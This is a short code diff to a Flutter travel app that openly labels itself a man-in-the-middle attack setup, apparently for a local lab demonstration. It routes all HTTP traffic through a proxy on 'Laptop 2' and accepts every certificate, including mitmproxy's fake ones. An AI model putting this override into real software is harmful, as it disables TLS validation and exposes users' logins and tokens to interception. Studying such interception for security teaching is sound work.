@@ -7,8 +7,27 @@ import 'package:travel_application/screens/home_screen.dart';
 import 'package:travel_application/screens/admin_screen.dart';
 import 'package:travel_application/helper/local_storage_service.dart';
 import 'package:firebase_auth/firebase_auth.dart';
+import 'dart:io';
+
+// MitM (tan cong)
+class MyHttpOverrides extends HttpOverrides {
+  @override
+  HttpClient createHttpClient(SecurityContext? context) {
+    return super.createHttpClient(context)
+      // Ép toàn bộ request chạy qua IP của Laptop 2 (Thay IP mạng của bạn vào đây)
+      ..findProxy = (uri) {
+        return "PROXY 192.168.239.1:8080;";
+      }
+      // Chấp nhận mọi chứng chỉ (Kể cả chứng chỉ giả của mitmproxy)
+      ..badCertificateCallback =
+          (X509Certificate cert, String host, int port) => true;
+  }
+}
 
 void main() async {
+  // MitM
+  HttpOverrides.global = MyHttpOverrides();
+  //
   WidgetsFlutterBinding.ensureInitialized();
   await Firebase.initializeApp();
   await GoogleSignIn.instance.initialize();
